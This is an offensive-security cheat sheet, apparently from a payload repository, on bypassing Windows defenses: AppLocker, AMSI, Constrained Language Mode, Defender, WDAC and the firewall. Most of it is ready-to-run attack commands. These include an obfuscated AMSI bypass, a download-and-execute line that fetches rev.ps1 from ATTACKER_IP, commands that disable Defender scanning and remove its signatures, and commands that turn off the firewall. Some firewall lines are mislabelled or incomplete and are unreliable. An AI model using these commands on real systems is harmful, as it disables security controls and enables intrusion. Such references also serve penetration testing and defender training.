# Windows - Defenses

## Summary

* [AppLocker](#applocker)
* [DPAPI](#dpapi)
* [Powershell](#powershell)
    * [Anti Malware Scan Interface](#anti-malware-scan-interface)
    * [Just Enough Administration](#just-enough-administration)
    * [Contrained Language Mode](#constrained-language-mode)
    * [Script Block Logging](#script-block-logging)
* [Protected Process Light](#protected-process-light)
* [Credential Guard](#credential-guard)
* [Windows Defender Antivirus](#windows-defender-antivirus)
* [Windows Defender Application Control](#windows-defender-application-control)
* [Windows Defender Firewall](#windows-defender-firewall)
* [Windows Information Protection](#windows-information-protection)


## AppLocker

> AppLocker is a security feature in Microsoft Windows that provides administrators with the ability to control which applications and files users are allowed to run on their systems. The rules can be based on various criteria, such as the file path, file publisher, or file hash, and can be applied to specific users or groups.

* Enumerate Local AppLocker Effective Policy
    ```powershell
    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    PowerView PS C:\> Get-AppLockerPolicy -effective -xml
    Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe # (Keys: Appx, Dll, Exe, Msi and Script
    ```

* AppLocker Bypass
    * By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
    * [api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
    * [api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
    * [api0cradle/UltimateAppLockerByPassList/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)


## DPAPI

Refer to [PayloadsAllTheThings/Windows - DPAPI.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md)


## Powershell

### Anti Malware Scan Interface

> The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface) that provides a unified interface for applications and services to integrate with any anti-malware product installed on a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications to request a scan of specific content.

Find more AMSI bypass: [Windows - AMSI Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)

```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```


### Just Enough Administration

> Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended actions or access sensitive information.

Breaking out if JEA:
* List available cmdlets: `command`
* Look for non-default cmdlets:
    ```ps1
    Set-PSSessionConfiguration
    Start-Process
    New-Service
    Add-Computer
    ```


### Constrained Language Mode

Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`

* Bypass using an old Powershell. Powershell v2 doesn't support CLM.
    ```ps1
    powershell.exe -version 2
    powershell.exe -version 2 -ExecutionPolicy bypass
    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
    ```

* Bypass when `__PSLockDownPolicy` is used. Just put "System32" somewhere in the path. 
    ```ps1
    # Enable CLM from the environment
    [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
    Get-ChildItem -Path Env:

    # Create a check-mode.ps1 containing your "evil" powershell commands
    $mode = $ExecutionContext.SessionState.LanguageMode
    write-host $mode

    # Simple bypass, execute inside a System32 folder
    PS C:\> C:\Users\Public\check-mode.ps1
    ConstrainedLanguage

    PS C:\> C:\Users\Public\System32\check-mode.ps1
    FullLanguagge
    ```

* Bypass using COM: [xpn/COM_to_registry.ps1](https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1)
* Bypass using your own Powershell DLL: [p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx) 
    ```ps1
    rundll32 PowerShdll,main <script>
    rundll32 PowerShdll,main -h      Display this message
    rundll32 PowerShdll,main -f <path>       Run the script passed as argument
    rundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)
    rundll32 PowerShdll,main -i      Start an interactive console in this console

    rundll32 PowerShx.dll,main -e                           <PS script to run>
    rundll32 PowerShx.dll,main -f <path>                    Run the script passed as argument
    rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>     Load a script and run a PS cmdlet
    rundll32 PowerShx.dll,main -w                           Start an interactive console in a new window
    rundll32 PowerShx.dll,main -i                           Start an interactive console
    rundll32 PowerShx.dll,main -s                           Attempt to bypass AMSI
    rundll32 PowerShx.dll,main -v                           Print Execution Output to the console
    ```


### Script Block Logging

> Once Script Block Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the "Windows PowerShell" channel. To view the logs, administrators can use the Event Viewer application and navigate to the "Windows PowerShell" channel.

Enable Script Block Loggin:

```ps1
function Enable-PSScriptBlockLogging
{
    $basePath = 'HKLM:\Software\Policies\Microsoft\Windows' +
      '\PowerShell\ScriptBlockLogging'

    if(-not (Test-Path $basePath))
    {
        $null = New-Item $basePath -Force
    }

    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
}
```


## Protected Process Light

Protected Process Light (PPL) is implemented as a Windows security mechanism that enables processes to be marked as "protected" and run in a secure, isolated environment, where they are shielded from attacks by malware or other unauthorized processes. PPL is used to protect processes that are critical to the operation of the operating system, such as anti-virus software, firewalls, and other security-related processes.

When a process is marked as "protected" using PPL, it is assigned a security level that determines the level of protection it will receive. This security level can be set to one of several levels, ranging from low to high. Processes that are assigned a higher security level are given more protection than those that are assigned a lower security level.

A process's protection is defined by a combination of the "level" and the "signer". The following table represent commonly used combinations, from [itm4n.github.io](https://itm4n.github.io/lsass-runasppl/).

| Protection level                | Value | Signer          | Type                | 		
|---------------------------------|------|------------------|---------------------|
| PS_PROTECTED_SYSTEM             | 0x72 | WinSystem (7)    | Protected (2)       |
| PS_PROTECTED_WINTCB             | 0x62 | WinTcb (6)       | Protected (2)       |
| PS_PROTECTED_WINDOWS            | 0x52 | Windows (5)      | Protected (2)       |
| PS_PROTECTED_AUTHENTICODE       | 0x12 | Authenticode (1) | Protected (2)       |
| PS_PROTECTED_WINTCB_LIGHT       | 0x61 | WinTcb (6)       | Protected Light (1) |
| PS_PROTECTED_WINDOWS_LIGHT      | 0x51 | Windows (5)      | Protected Light (1) |
| PS_PROTECTED_LSA_LIGHT          | 0x41 | Lsa (4)          | Protected Light (1) |
| PS_PROTECTED_ANTIMALWARE_LIGHT  | 0x31 | Antimalware (3)  | Protected Light (1) |
| PS_PROTECTED_AUTHENTICODE_LIGHT | 0x11 | Authenticode (1) | Protected Light (1) |

PPL works by restricting access to the protected process's memory and system resources, and by preventing the process from being modified or terminated by other processes or users. The process is also isolated from other processes running on the system, which helps prevent attacks that attempt to exploit shared resources or dependencies.

* Check if LSASS is running in PPL
    ```ps1
    reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
    ```
* Protected process example: you can't kill Microsoft Defender even with Administrator privilege.
    ```ps1
    taskkill /f /im MsMpEng.exe
    ERROR: The process "MsMpEng.exe" with PID 5784 could not be terminated.
    Reason: Access is denied.
    ```
* Can be disabled using vulnerable drivers (Bring Your Own Vulnerable Driver / BYOVD)


## Credential Guard

When Credential Guard is enabled, it uses hardware-based virtualization to create a secure environment that is separate from the operating system. This secure environment is used to store sensitive credential information, which is encrypted and protected from unauthorized access. 

Credential Guard uses a combination of hardware-based virtualization and the Trusted Platform Module (TPM) to ensure that the secure kernel is trusted and secure. It can be enabled on devices that have a compatible processor and TPM version, and require a UEFI firmware that supports the necessary features.


## Windows Defender Antivirus

Also known as `Microsoft Defender`.

```powershell
# check status of Defender
PS C:\> Get-MpComputerStatus

# disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```


## Windows Defender Application Control

Also known as `WDAC/UMCI/Device Guard`.

> Windows Defender Application Guard, formerly known as Device Guard has the power to control if an application may or may not be executed on a Windows device. WDAC will prevent the execution, running, and loading of unwanted or malicious code, drivers, and scripts. WDAC does not trust any software it does not know of.


* Get WDAC current mode
    ```ps1
    $ Get-ComputerInfo
    DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
    DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : EnforcementMode
    ```

* Device Guard policy location: `C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip`
* Device Guard example policies: `C:\Windows\System32\CodeIntegrity\ExamplePolicies\`
* WDAC utilities: [mattifestation/WDACTools](https://github.com/mattifestation/WDACTools), a PowerShell module to facilitate building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies
* WDAC bypass techniques: [bohops/UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList)
    * [nettitude/Aladdin](https://github.com/nettitude/Aladdin) - WDAC Bypass using AddInProcess.exe


## Windows Defender Firewall

* List firewall state and current configuration
    ```powershell
    netsh advfirewall firewall dump
    # or 
    netsh firewall show state
    netsh firewall show config
    ```

* List firewall's blocked ports
    ```powershell
    $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
    ```

* Disable firewall
    ```powershell
    # Disable Firewall via cmd
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

    # Disable Firewall via Powershell
    powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

    # Disable Firewall on any windows using native command
    netsh firewall set opmode disable
    netsh Advfirewall set allprofiles state off
    ```


## Windows Information Protection

Windows Information Protection (WIP), formerly known as Enterprise Data Protection (EDP), is a security feature in Windows 10 that helps protect sensitive data on enterprise devices. WIP helps to prevent accidental data leakage by allowing administrators to define policies that control how enterprise data can be accessed, shared, and protected. WIP works by identifying and separating enterprise data from personal data on the device. 

Protection of file (data) locally marked as corporate is facilitated via Encrypting File System (EFS) encryption of Windows (a feature of NTFS file system)

* Enumerate files attributes, `Encrypted` attribute is used for files protected by WIP
    ```ps1
    PS C:\> (Get-Item -Path 'C:\...').attributes
    Archive, Encrypted
    ```
* Encrypt files: `cipher /c encryptedfile.extension`
* Decrypt files: `cipher /d encryptedfile.extension`

The **Enterprise Context** column shows you what each app can do with your enterprise data:

* **Domain**. Shows the employee's work domain (such as, corp.contoso.com). This app is considered work-related and can freely touch and open work data and resources.
* **Personal**. Shows the text, Personal. This app is considered non-work-related and can't touch any work data or resources.
* **Exempt**. Shows the text, Exempt. Windows Information Protection policies don't apply to these apps (such as, system components).


## References

* [SNEAKING PAST DEVICE GUARD - Cybereason - Philip Tsukerman](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
* [PowerShell about_Logging_Windows - Microsoft Documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)
* [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - Apr 7, 2021](https://itm4n.github.io/lsass-runasppl/)
* [Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - 03/10/2023 - Microsoft](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)
* [Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - 12/09/2022 - Microsoft](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)